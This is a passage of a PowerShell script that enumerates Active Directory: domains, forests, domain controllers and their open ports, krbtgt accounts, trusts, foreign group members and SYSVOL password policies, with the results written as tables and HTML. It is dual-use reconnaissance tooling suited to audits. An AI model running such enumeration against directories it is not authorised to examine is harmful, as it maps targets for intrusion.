    $TempTargetDomains = foreach($AllDomain in $AllDomains){
		$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $AllDomain)
		$TargetDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
		$domainRootDSE = [ADSI]("LDAP://" + $TargetDomain + "/RootDSE")
		$domainFunctionalLevel = $domainRootDSE.Get("domainFunctionality")
		$domainFunctionalLevelName = $functionalLevelMapping[[int]$domainFunctionalLevel]
		$PrincipalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $TargetDomain.Name)
		$DomainAdminsGroup = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($PrincipalContext, "Domain Admins")
		$DomainAdminsSid = $DomainAdminsGroup.Sid.ToString()
		$DomainSid = $DomainAdminsSid.Substring(0, $DomainAdminsSid.LastIndexOf('-'))
		$CompiledDomainName = $AllDomain -replace "\.",",dc="
		$CompiledAddress = "LDAP://dc=$CompiledDomainName"
		$MSDSBehaviorVersion = ([ADSI]"$CompiledAddress").get("MSDS-Behavior-Version")
		
		[PSCustomObject]@{
			Domain = $TargetDomain.Name
			"NetBIOS" = ([ADSI]"LDAP://$AllDomain").dc -Join " - "
			"Domain SID" = $DomainSid
			"Domain Functional Level" = "$domainFunctionalLevelName ($MSDSBehaviorVersion)"
			Forest = $TargetDomain.Forest
			Parent = $TargetDomain.Parent
			Children = $TargetDomain.Children -join ' - '
			#"Domain Controllers" = $TargetDomain.DomainControllers -join ' - '
		}
	}

    if($TempTargetDomains){
		$TempTargetDomains | Sort-Object Forest,Parent,Domain | ft -Autosize -Wrap
		$HTMLTargetDomain = $TempTargetDomains | Sort-Object Forest,Parent,Domain | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='TargetDomains'>Target Domains</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='TargetDomains'>" }
    }
	
	#############################################
    ########### Forests ###########
	#############################################
	
	Write-Host ""
	Write-Host "Forests" -ForegroundColor Cyan
	$TempAllForests = @()
	$DefineAllForests = @($TempTargetDomains.Forest.Name | Sort-Object -Unique)
	$TempAllForests = foreach($Forest in $DefineAllForests){
		$ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
		$TargetForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
		$SitesNames = $TargetForest.Sites.Name -join ", "
		$ForestModeLevel = $functionalLevelMapping[[int]$TargetForest.ForestModeLevel]
		$CompiledForestName = $Forest -replace "\.",",dc="
		$CompiledAddress = "LDAP://cn=partitions,cn=configuration,dc=$CompiledForestName"
		$MSDSBehaviorVersion = ([ADSI]"$CompiledAddress").get("MSDS-Behavior-Version")
		if($MSDSBehaviorVersion -ge 4){
			$ConfigurationNamingContext = "CN=Configuration,DC=" + $Forest.replace(".", ",DC=")
			$RecycleBinFeaturePath = "LDAP://CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,$ConfigurationNamingContext"
			try {
				$RecycleBinFeature = [ADSI]$RecycleBinFeaturePath
				if ($RecycleBinFeature -AND $RecycleBinFeature.psbase.Properties["msDS-EnabledFeatureBL"] -ne $null) {
					$RecycleStatus = "Enabled"
				} else {
					$RecycleStatus = "Not Enabled"
				}
			} catch {
				$RecycleStatus = "Unknown"
			}
		}
		
		[PSCustomObject]@{
			"Name" = $TargetForest.Name
			"Forest Functional Level" = "$ForestModeLevel ($MSDSBehaviorVersion)"
			"Recycle Bin" = $RecycleStatus
			"Root Domain" = $TargetForest.RootDomain
			"Schema Role Owner" = $TargetForest.SchemaRoleOwner
			"Naming Role Owner" = $TargetForest.NamingRoleOwner
			"Sites" = $SitesNames
		}
		
	}

	if ($TempAllForests) {
		$TempAllForests | Sort-Object Name | Format-Table -AutoSize -Wrap
		$HTMLAllForests = $TempAllForests | Sort-Object Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='AllForests'>Forests</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='AllForests'>" }
	}
	
# Define the custom type with the API declaration
$code = @"
using System;
using System.Runtime.InteropServices;

public class NativeMethods
{
    [DllImport("Netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern uint NetStatisticsGet(
        string server,
        string service,
        int level,
        int options,
        out IntPtr bufptr);

    [StructLayout(LayoutKind.Sequential)]
    public struct STAT_WORKSTATION_0
    {
        public long StatisticsStartTime;
    }

    [DllImport("Netapi32.dll", SetLastError = true)]
    public static extern int NetApiBufferFree(IntPtr Buffer);

    public static DateTime GetStartupTime(string server)
    {
        IntPtr buffer = IntPtr.Zero;
        uint ret = NetStatisticsGet(server, "LanmanWorkstation", 0, 0, out buffer);
        if (ret != 0)
        {
            return DateTime.MinValue;
        }

        try
        {
            STAT_WORKSTATION_0 data = (STAT_WORKSTATION_0)Marshal.PtrToStructure(buffer, typeof(STAT_WORKSTATION_0));
            return DateTime.FromFileTime(data.StatisticsStartTime);
        }
        finally
        {
            NetApiBufferFree(buffer);
        }
    }
}
"@

# Add the type to the current PowerShell session
Add-Type -TypeDefinition $code
	
	if($TargetsOnly){
		
	    $TempGetDomainTrust = foreach($AllDomain in $AllDomains){
			$GetDomainTrusts = @($AllDomainTrusts | Where-Object {$_.SourceName -eq $AllDomain})
			
			foreach ($GetDomainTrust in $GetDomainTrusts) {
				[PSCustomObject]@{
					"Source Name" = $GetDomainTrust.SourceName
					"Target Name" = $GetDomainTrust.TargetName
     					"Trust Direction" = $GetDomainTrust.TrustDirection
	  				"SIDHistory" = $GetDomainTrust.SIDHistoryStatus
       					"Filter_SIDS" = $GetDomainTrust.Filter_SIDS
					"Trust Type" = $GetDomainTrust.TrustType
					"Trust Attributes" = $GetDomainTrust.TrustAttributes
					"When Created" = $GetDomainTrust.WhenCreated
					"When Changed" = $GetDomainTrust.WhenChanged
				}
			}
		}
	
	    if($TempGetDomainTrust){
     		Write-Host ""
			Write-Host "Domain Trusts" -ForegroundColor Cyan
			$TempGetDomainTrust | Format-Table -AutoSize -Wrap
		}
    		

		#############################################
    ############# Domain Controllers ################
	#############################################
		
		Write-Host ""
		Write-Host "Domain Controllers" -ForegroundColor Cyan
		$TempHTMLdc = @()
		foreach($AllDomain in $AllDomains){
			$domainControllers = $TotalDomainControllers | Where-Object {$_.domain -eq $AllDomain}
			foreach ($dc in $domainControllers) {
				$TestingLDAP = Test-LDAPConnectivity -ComputerName $dc.dnshostname
				#$isPrimaryDC = $RIDRoleDCs.dnshostname -contains $dc.dnshostname
				#$primaryDC = if($isPrimaryDC) {"YES"} else {"NO"}
				$startupTime = [NativeMethods]::GetStartupTime($dc.dnshostname)
				if($dc.DnsHostName){$ipaddress = (Resolve-DnsName -Name $dc.DnsHostName -Type A).IPAddress}
				if($ipaddress.count -gt 1){$ipaddress = $ipaddress -join ", "}
				if($startupTime -eq "01 January 0001 00:00:00"){
					$UptimeString = "No Access"
				}
				else{
					$uptime = New-TimeSpan -Start $startupTime -End (Get-Date)
					$UptimeString = "$($uptime.Days) days"
				}
				
				$CompiledDomainName = $AllDomain -replace "\.",",dc="
				$ntdsSettingsPath = "LDAP://cn=NTDS Settings,cn=$($dc.Name),cn=Servers,cn=Default-First-Site-Name,cn=Sites,cn=Configuration,dc=$CompiledDomainName"
				$ntdsSettings = [ADSI]$ntdsSettingsPath
				$dcBehaviorVersion = $ntdsSettings.get("msDS-Behavior-Version")
				$TextFuncLevel = $functionalLevelMapping[[int]$dcBehaviorVersion]
				$MaxFunctionalLevel = "$TextFuncLevel ($dcBehaviorVersion)"
				
				$TempHTMLdc += [PSCustomObject]@{
					"DC Name" = $dc.Name
					"OS Version" = $dc.operatingsystem
					"IP Address" = $ipaddress
					"Max Functional Level" = $MaxFunctionalLevel
					"LDAP" = $TestingLDAP.PortLDAP
					"LDAPS" = $TestingLDAP.PortLDAPS
					"OpenPorts" = $TestingLDAP.SuccessfulPorts
					"Uptime" = $UptimeString
					#"Primary" = if($RIDRoleDCs.dnshostname -contains $dc.dnshostname) {"YES"} else {"NO"}
					Domain = $dc.Domain
				}
			}
		}
		
		if($OutboundTrusts){
			foreach($OutTrust in $OutboundTrusts){
				$result = nslookup -type=all "_ldap._tcp.dc._msdcs.$OutTrust" 2>$null
				if ($result) {
					$OutTrustDCs = @($result | Where-Object { $_ -like '*svr hostname*' } | ForEach-Object { $_.Split('=')[-1].Trim() })
					
					foreach ($dc in $OutTrustDCs) {
						$dcIP = ($result | Where-Object { $_ -like "*$dc*" -AND $_ -like "*internet address*" } | Select-Object -First 1).Split('=')[-1].Trim()
						$dcname = $dc -replace "\.$OutTrust","$"
						if ($dcIP) {
							$TempHTMLdc += [PSCustomObject]@{
								"DC Name"   = $dcname
								"OS Version" = ""
								"IP Address" = $dcIP
								"Max Functional Level" = ""
								"LDAP" = ""
								"LDAPS" = ""
								"OpenPorts" = ""
								"Uptime" = ""
								Domain = $OutTrust
							}
						} else {
							$TempHTMLdc += [PSCustomObject]@{
								"DC Name"   = $dcname
								"OS Version" = ""
								"IP Address" = "Not found"
								Domain = $OutTrust
							}
						}
					}
				}
			}
		}
		
		if($TempHTMLdc ){
			$TempHTMLdc | Sort-Object Domain,"DC Name" | ft -Autosize -Wrap
		}
		
		Write-Host ""
		Write-Host "Accounts Analysis" -ForegroundColor Cyan
		
		$QuickDomainAnalysis = foreach($AllDomain in $AllDomains){
				
			[PSCustomObject]@{
				"Total Users" = @($TotalEnabledDisabledUsers | Where-Object {$_.domain -eq $AllDomain}).count
				"Total Machines" = @($TotalEnabledDisabledMachines | Where-Object {$_.domain -eq $AllDomain}).count
				"Enabled Users" = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain}).count
				"Disabled Users" = @($TotalDisabledUsers | Where-Object {$_.domain -eq $AllDomain}).count
				"Enabled Servers" = @($TotalEnabledServers | Where-Object {$_.domain -eq $AllDomain}).count
				"Disabled Servers" = @($TotalDisabledServers | Where-Object {$_.domain -eq $AllDomain}).count
				"Enabled Workstations"  = @($TotalEnabledWorkstations | Where-Object {$_.domain -eq $AllDomain}).count
				"Disabled Workstations"  = @($TotalDisabledWorkstations | Where-Object {$_.domain -eq $AllDomain}).count
				Domain = $AllDomain
			}
			
		}
		
		$QuickDomainAnalysis | ft -Autosize -Wrap
		
		break
	}
	else{}
	
	#############################################
    ############ Krbtgt Accounts ################
	#############################################
	
    Write-Host ""
    Write-Host "Krbtgt Accounts" -ForegroundColor Cyan
    	
	$TempKrbtgtAccount = foreach($AllDomain in $AllDomains){
		$KrbtgtAccount = @($AllkrbtgtAccounts | Where-Object {$_.domain -eq $AllDomain})
		
		[PSCustomObject]@{
			Account = $KrbtgtAccount.samaccountname
			"Account SID"  = GetSID-FromBytes -sidBytes $KrbtgtAccount.objectsid
			"When Created" = ($KrbtgtAccount.whencreated).ToString("dd/MM/yyyy")
			"When Changed" = (Convert-LdapTimestamp -timestamp $KrbtgtAccount.pwdlastset).ToString("dd/MM/yyyy")
			"SPN" = $KrbtgtAccount.serviceprincipalname
			Domain = $AllDomain
		}
	}


    if($TempKrbtgtAccount){
		$TempKrbtgtAccount | Sort-Object Domain | ft -Autosize -Wrap
		$HTMLKrbtgtAccount = $TempKrbtgtAccount | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='KrbtgtAccounts'>Krbtgt Accounts</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='KrbtgtAccounts'>" }
	}
	
	#############################################
    ########## Domain Controllers ###############
	#############################################
	
	Write-Host ""
    Write-Host "Domain Controllers" -ForegroundColor Cyan
	$TempHTMLdc = @()
    foreach($AllDomain in $AllDomains){
		$domainControllers = $TotalDomainControllers | Where-Object {$_.domain -eq $AllDomain}
		foreach ($dc in $domainControllers) {
			$TestingLDAP = Test-LDAPConnectivity -ComputerName $dc.dnshostname
			#$isPrimaryDC = $RIDRoleDCs.dnshostname -contains $dc.dnshostname
			#$primaryDC = if($isPrimaryDC) {"YES"} else {"NO"}
			$startupTime = [NativeMethods]::GetStartupTime($dc.dnshostname)
			if($dc.DnsHostName){$ipaddress = (Resolve-DnsName -Name $dc.DnsHostName -Type A).IPAddress}
			if($ipaddress.count -gt 1){$ipaddress = $ipaddress -join ", "}
			if($startupTime -eq "01 January 0001 00:00:00"){
				$UptimeString = "No Access"
			}
			else{
				$uptime = New-TimeSpan -Start $startupTime -End (Get-Date)
				$UptimeString = "$($uptime.Days) days"
			}
			
			$CompiledDomainName = $AllDomain -replace "\.",",dc="
			$ntdsSettingsPath = "LDAP://cn=NTDS Settings,cn=$($dc.Name),cn=Servers,cn=Default-First-Site-Name,cn=Sites,cn=Configuration,dc=$CompiledDomainName"
			$ntdsSettings = [ADSI]$ntdsSettingsPath
			$dcBehaviorVersion = $ntdsSettings.get("msDS-Behavior-Version")
			$TextFuncLevel = $functionalLevelMapping[[int]$dcBehaviorVersion]
			$MaxFunctionalLevel = "$TextFuncLevel ($dcBehaviorVersion)"
			
			$TempHTMLdc += [PSCustomObject]@{
				"DC Name" = $dc.Name
				"OS Version" = $dc.operatingsystem
				"IP Address" = $ipaddress
				"Max Functional Level" = $MaxFunctionalLevel
				"LDAP" = $TestingLDAP.PortLDAP
				"LDAPS" = $TestingLDAP.PortLDAPS
				"OpenPorts" = $TestingLDAP.SuccessfulPorts
				"Uptime" = $UptimeString
				"Primary" = if($RIDRoleDCs.dnshostname -contains $dc.dnshostname) {"YES"} else {"NO"}
				Domain = $dc.Domain
			}
		}
	}
	
	if($OutboundTrusts){
		foreach($OutTrust in $OutboundTrusts){
			$result = nslookup -type=all "_ldap._tcp.dc._msdcs.$OutTrust" 2>$null
			if ($result) {
				$OutTrustDCs = @($result | Where-Object { $_ -like '*svr hostname*' } | ForEach-Object { $_.Split('=')[-1].Trim() })
				
				foreach ($dc in $OutTrustDCs) {
					$dcIP = ($result | Where-Object { $_ -like "*$dc*" -AND $_ -like "*internet address*" } | Select-Object -First 1).Split('=')[-1].Trim()
					$dcname = $dc -replace "\.$OutTrust","$"
					if ($dcIP) {
						$TempHTMLdc += [PSCustomObject]@{
							"DC Name"   = $dcname
							"OS Version" = ""
							"IP Address" = $dcIP
							"Max Functional Level" = ""
							"LDAP" = ""
							"LDAPS" = ""
							"OpenPorts" = ""
							"Uptime" = ""
							Domain = $OutTrust
						}
					} else {
						$TempHTMLdc += [PSCustomObject]@{
							"DC Name"   = $dcname
							"OS Version" = ""
							"IP Address" = "Not found"
							Domain = $OutTrust
						}
					}
				}
			}
		}
	}
	
	if($TempHTMLdc){
		$TempHTMLdc | Sort-Object Domain,"DC Name" | ft -Autosize -Wrap
		$HTMLdc = $TempHTMLdc | Sort-Object Domain,"DC Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DomainControllers'>Domain Controllers</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DomainControllers'>" }
	}
	
	#############################################
    ###### Domains for the current forest #######
	#############################################
    
    Write-Host ""
	Write-Host "Domains for the current forest" -ForegroundColor Cyan
	
	$ForestObject = @([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())
	$GetForestDomains = $ForestObject.domains
	$TempForestDomain = foreach ($GetForestDomain in $GetForestDomains) {
		$domainFLevelName = $functionalLevelMapping[[int]$GetForestDomain.DomainModeLevel]
		[PSCustomObject]@{
			"Domain" = $GetForestDomain.Name
			"Forest" = $GetForestDomain.Forest
			"Parent" = $GetForestDomain.Parent
			"Children" = $GetForestDomain.Children -join ', '
			"Domain Functional Level" = "$domainFLevelName ($($GetForestDomain.DomainModeLevel))"
			"Pdc Role Owner" = $GetForestDomain.PdcRoleOwner
			"Rid Role Owner" = $GetForestDomain.RidRoleOwner
			"Infrastructure Role Owner" = $GetForestDomain.InfrastructureRoleOwner
		}
	}

	if ($TempForestDomain) {
		$TempForestDomain | Sort-Object Domain | Format-Table -AutoSize -Wrap
		$HTMLForestDomain = $TempForestDomain | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='CurrentForestDomains'>Domains for the current forest</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='CurrentForestDomains'>" }
	}

    #############################################
    ########### Forest Global Catalog ###########
	#############################################
	
	Write-Host ""
	Write-Host "Forest Global Catalog" -ForegroundColor Cyan
	$TempForestGlobalCatalog = @()
	$DefineAllForests = @($TempTargetDomains.Forest.Name | Sort-Object -Unique)
	$ForestCatalogObjects = @(foreach($Forest in $DefineAllForests){ $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest);[System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)})
	$GetForestGlobalCatalog = @(foreach($ForestObject in $ForestCatalogObjects){$ForestObject.FindAllGlobalCatalogs()})
	$TempForestGlobalCatalog = foreach ($GC in $GetForestGlobalCatalog) {
		[PSCustomObject]@{
			"DC Name" = $GC.Name
			"Forest" = $GC.Forest
			"Domain" = $GC.Domain
			"OS Version" = $GC.OSVersion
			"IP Address" = $GC.IPAddress
		}
	}

	if ($TempForestGlobalCatalog) {
		$TempForestGlobalCatalog | Sort-Object Forest,Domain,"DC Name" | Format-Table -AutoSize -Wrap
		$HTMLForestGlobalCatalog = $TempForestGlobalCatalog | Sort-Object Forest,Domain,"DC Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ForestGlobalCatalog'>Forest Global Catalog</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ForestGlobalCatalog'>" }
	}


    #############################################
    ############### Domain Trusts ###############
	#############################################
	
	Write-Host ""
	Write-Host "Domain Trusts" -ForegroundColor Cyan
	
    $TempGetDomainTrust = foreach($AllDomain in $AllDomains){
		$GetDomainTrusts = @($AllDomainTrusts | Where-Object {$_.SourceName -eq $AllDomain})
		
		foreach ($GetDomainTrust in $GetDomainTrusts) {
			[PSCustomObject]@{
				"Source Name" = $GetDomainTrust.SourceName
				"Target Name" = $GetDomainTrust.TargetName
				"Trust Direction" = $GetDomainTrust.TrustDirection
				"SIDHistory" = $GetDomainTrust.SIDHistoryStatus
    				"Filter_SIDS" = $GetDomainTrust.Filter_SIDS
				"Trust Type" = $GetDomainTrust.TrustType
				"Trust Attributes" = $GetDomainTrust.TrustAttributes
				"When Created" = $GetDomainTrust.WhenCreated
				"When Changed" = $GetDomainTrust.WhenChanged
			}
		}
	}

    if($TempGetDomainTrust){
		$TempGetDomainTrust | Sort-Object "Source Name","Target Name" | Format-Table -AutoSize -Wrap
		$HTMLGetDomainTrust = $TempGetDomainTrust | Sort-Object "Source Name","Target Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DomainTrusts'>Domain Trusts</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DomainTrusts'>" }
	}
	
	#############################################
    ############## Trust Accounts ###############
	#############################################
    
    Write-Host ""
    Write-Host "Trust Accounts" -ForegroundColor Cyan
    $TempTrustAccounts = foreach($AllDomain in $AllDomains){
		$TrustAccounts = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain -AND ([int]$_.userAccountControl -band 2048) -ne 0})
		
		foreach($TrustAccount in $TrustAccounts){
			
			[PSCustomObject]@{
				Domain = $AllDomain
				Name = $TrustAccount.samaccountname
				"Object SID" = GetSID-FromBytes -sidBytes $TrustAccount.objectsid
				"Object GUID" = ([guid]::New(([string]::Join('', ($TrustAccount.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[0..7] -join '') + "-" + 
                                              ([string]::Join('', ($TrustAccount.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[8..11] -join '') + "-" +
                                              ([string]::Join('', ($TrustAccount.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[12..15] -join '') + "-" +
                                              ([string]::Join('', ($TrustAccount.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[16..19] -join '') + "-" +
                                              ([string]::Join('', ($TrustAccount.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[20..31] -join ''))).Guid
				"Account Type" = switch ($TrustAccount.samAccountType) {
					805306368 { "User" }
					805306369 { "Computer" }
					805306370 { "Trust Account" }
					default { "Unknown" }
				}
			}
		}
	}
	
	if($TempTrustAccounts){
		$TempTrustAccounts | Sort-Object Domain,Name | ft -AutoSize -Wrap
		$HTMLTrustAccounts = $TempTrustAccounts | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='TrustAccounts'>Trust Accounts</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='TrustAccounts'>" }
	}
	
	#############################################
    ####### Trusted Domain Object GUIDs #########
	#############################################

    Write-Host ""
    Write-Host "Trusted Domain Object GUIDs" -ForegroundColor Cyan
    $TDOTargetNames = @(foreach($AllDomain in $AllDomains){$AllDomainTrusts | Where-Object { $_.SourceName -eq $AllDomain}})
	
	$TempTrustedDomainObjectGUIDs = foreach($AllDomain in $AllDomains){
		$TDOSourceDomainName = "DC=" + $AllDomain.Split(".")
		$TDOSourceDomainName = $TDOSourceDomainName -replace " ", ",DC="
		foreach($TDOTargetName in $TDOTargetNames){
			$TDOName = "CN=$($TDOTargetName.TargetName),CN=System,$TDOSourceDomainName"
			$TrustedDomainObjectGUIDs = @(Collect-ADObjects -Domain $AllDomain -LDAP "distinguishedname=$TDOName")
			
			foreach ($TrustedDomainObjectGUID in $TrustedDomainObjectGUIDs) {
				[PSCustomObject]@{
					"Source Name" = $AllDomain
					"Target Name" = $($TDOTargetName.TargetName)
					"Direction" = $($TDOTargetName.TrustDirection)
					"Object GUID" = ([guid]::New(([string]::Join('', ($TrustedDomainObjectGUID.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[0..7] -join '') + "-" + 
                                              ([string]::Join('', ($TrustedDomainObjectGUID.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[8..11] -join '') + "-" +
                                              ([string]::Join('', ($TrustedDomainObjectGUID.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[12..15] -join '') + "-" +
                                              ([string]::Join('', ($TrustedDomainObjectGUID.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[16..19] -join '') + "-" +
                                              ([string]::Join('', ($TrustedDomainObjectGUID.objectGuid | ForEach-Object { "{0:X2}" -f $_ }))[20..31] -join ''))).Guid
				}
			}
		}
	}
	
	if($TempTrustedDomainObjectGUIDs){
		$TempTrustedDomainObjectGUIDs | Sort-Object "Source Name","Target Name",Direction,"Object GUID" -Unique | ft -AutoSize -Wrap
		$HTMLTrustedDomainObjectGUIDs = $TempTrustedDomainObjectGUIDs | Sort-Object "Source Name","Target Name",Direction,"Object GUID" -Unique | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='TrustedDomainObjectGUIDs'>Trusted Domain Object GUIDs</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='TrustedDomainObjectGUIDs'>" }
	}
	
	if($PlaceHolderDomains.count -gt 1){
		#############################################
		################ Outsiders ##################
		#############################################
			
		Write-Host ""
		Write-Host "Foreign Domain Members" -ForegroundColor Cyan
		
		$ExcludeGroups = @('Users', 'Domain Users', 'Guests')
		
		$ForeignGroupMembers = @()
		$ForeignGroupMembers = foreach ($group in $TotalGroups) {
			$GroupName = $group.samAccountName
			$GroupDistinguishedName = $group.distinguishedname
			$GroupDomain = $group.domain

			if ($ExcludeGroups -notcontains $GroupName) {
				foreach ($member in $group.member) {
					if ($member -match 'CN=S-1-5-21.*-.*' -and $member -match "CN=ForeignSecurityPrincipals") {
						$MemberDomain = ($member -replace '.*DC=([^,]+),DC=([^,]+).*', '$1.$2')
						$MemberDistinguishedName = $member
						$MemberName = ($member -split ',')[0] -replace 'CN=', ''

						[PSCustomObject]@{
							GroupDomain            = $GroupDomain
							GroupName              = $GroupName
							GroupDistinguishedName = $GroupDistinguishedName
							MemberDomain           = $MemberDomain
							MemberName             = $MemberName
							MemberDistinguishedName = $MemberDistinguishedName
						}
					}
				}
			}
		}
		
		$TempForeignGroupMembers = @()
		$TempForeignGroupMembers = foreach ($ForeignGroupMember in $ForeignGroupMembers) {
			
			$ExtractedMemberName = $null
			$TargetExtractedDomain = $null
			$GroupMembers = @()
   
   			$ExtractedObject = $SumGroupsUsers | Where-Object {$_.domain -ne $ForeignGroupMember.GroupDomain} | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq $ForeignGroupMember.MemberName}
			if ($ExtractedObject) {
				$ExtractedMemberName = $ExtractedObject.samaccountname
				$TargetExtractedDomain = $ExtractedObject.domain
				$ObjectsForTheDomain = @($SumGroupsUsers | Where-Object {$_.domain -eq $TargetExtractedDomain})
			}

			$GroupMembers = if($ExtractedMemberName) {RecursiveGroupMembers -Identity $ExtractedMemberName -AllADObjects $ObjectsForTheDomain} else {""}
			$FinalMembers = $GroupMembers.MemberName -join ' - '
			
			##$convertedMemberName = ($TargetExtractedDomain -split "\.")[0] + "\" + $ExtractedMemberName
			
			[PSCustomObject]@{
				"Group Domain" = $ForeignGroupMember.GroupDomain
				"Group Name" = $ForeignGroupMember.GroupName
				"Member Domain" = $TargetExtractedDomain
				"Member or Group Name" = $ExtractedMemberName
				"Member or Group SID" = $ForeignGroupMember.MemberName
				"Group Members" = $FinalMembers
			}
		}

		if ($TempForeignGroupMembers) {
			$TempForeignGroupMembers | Where-Object {$_."Member or Group Name" -ne $null -or (Test-SidFormat -SidString $_."Member or Group SID")} | Sort-Object "Group Domain","Group Name" | Format-Table -AutoSize -Wrap
			$HTMLGetDomainForeignGroupMember = $TempForeignGroupMembers | Where-Object {$_."Member or Group Name" -ne $null -or (Test-SidFormat -SidString $_."Member or Group SID")} | Sort-Object "Group Domain","Group Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ForeignDomainMembers'>Foreign Domain Members</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ForeignDomainMembers'>" }
		}
	}

 	################################################
    ######### Domain Analysis ###############
	################################################
	
	$AnalysisBanner = "<h3>Active Directory Domain Analysis</h3>"
	Write-Host ""
	Write-Host "Active Directory Domain Analysis" -ForegroundColor Red
	Write-Host ""
	
	################################################
    ######### Domain Password Policy ###############
	################################################
		
	Write-Host ""
	Write-Host "Default Domain Policy" -ForegroundColor Cyan
	$TempDomainPolicy = foreach ($AllDomain in $AllDomains) {
		$SelectDomainPolicy = $DomainPolicy | Where-Object { $_.domain -eq $AllDomain }
		$MinPwdAge = Convert-ADTimeToDays -Interval $SelectDomainPolicy.'minPwdAge'
		if($MinPwdAge -eq "Never Expires"){}else{$MinPwdAge = "$MinPwdAge day(s)"}
		$MaxPwdAge = Convert-ADTimeToDays -Interval $SelectDomainPolicy.'maxPwdAge'
		if($MaxPwdAge -eq "Never Expires"){}else{$MaxPwdAge = "$MaxPwdAge day(s)"}
		[PSCustomObject]@{
			"Domain"				= $AllDomain
			"Pwd Complexity"		= if ($SelectDomainPolicy.'pwdProperties' -band 1) {"Enabled"} else {"Disabled"}
			"Min Pwd Length"		= $SelectDomainPolicy.'minPwdLength'
			"Min Pwd Age"			= $MinPwdAge
			"Max Pwd Age"			= $MaxPwdAge
			"Password History"		= $SelectDomainPolicy.'pwdHistoryLength'
			"Lockout Threshold"		= $SelectDomainPolicy.'lockoutThreshold'
			"Reversible Encryption"	= if ($SelectDomainPolicy.'pwdProperties' -band 16) {"Enabled"} else {"Disabled"}
		}
	}

 	if ($TempDomainPolicy) {
		if(!$NoOutput){$TempDomainPolicy | Sort-Object Domain | Format-Table -AutoSize -Wrap}
		$HTMLDomainPolicy = $TempDomainPolicy | Sort-Object Domain | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DomainPolicy'>Default Domain Policy</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DomainPolicy'>" }
	}
	
	################################################
    ######### Other Password Policies ###############
	################################################
		
	Write-Host ""
	Write-Host "Other Password Policies" -ForegroundColor Cyan
	
	$TempOtherPolicies = @()
	$TempOtherPolicies += foreach ($AllDomain in $AllDomains) {
		
		$sysvolPath = "\\$AllDomain\SYSVOL\$AllDomain\Policies"

		$GptTmplFiles = Get-ChildItem -Path $sysvolPath -Filter GptTmpl.inf -Recurse
		foreach ($file in $GptTmplFiles) {
			# Read the content of the Registry.pol file as a single string
			$content = Get-Content -Path $file.FullName -Encoding Unicode -Raw

			$pattern = "PasswordComplexity"

			# Perform the regex match to find the pattern
			if ($content -match $pattern) {
				
				$TempGPOPath = if ($file.DirectoryName -match '(.*\})') {$matches[1]}
				$TargetGPO = @($AllCollectedGPOs | Where-Object {$_.domain -eq $AllDomain -AND $_.gpcfilesyspath -eq $TempGPOPath -and $_.displayname -ne "Default Domain Policy"})
				if($TargetGPO){
					$GPOGuid = ($TargetGPO.gpcfilesyspath -split "}")[-2].split("{")[-1]  # Extracting the GPO's GUID
					$TargetOUs = @($AllCollectedOUs | Where-Object { $_.domain -eq $AllDomain -AND $_.gplink -like "*$GPOGuid*"} )
					$OUs = $TargetOUs.name -Join " - "
					
					# Extracting policy settings from the file content
					$MinPwdAge = if ($content -match "MinimumPasswordAge\s*=\s*(\d+)") {$matches[1]}
					$MaxPwdAge = if ($content -match "MaximumPasswordAge\s*=\s*(\d+)") {
						if ($matches[1] -eq "0") {"Never Expires"} else {$matches[1]}
					}
					if($MaxPwdAge -eq "Never Expires"){}else{$MaxPwdAge = "$MaxPwdAge day(s)"}
					$MinPwdLength = if ($content -match "MinimumPasswordLength\s*=\s*(\d+)") {$matches[1]}
					$PwdComplexity = if ($content -match "PasswordComplexity\s*=\s*(\d+)") {if ($matches[1] -eq "1") {"Enabled"} else {"Disabled"}}
					$PwdHistorySize = if ($content -match "PasswordHistorySize\s*=\s*(\d+)") {$matches[1]}
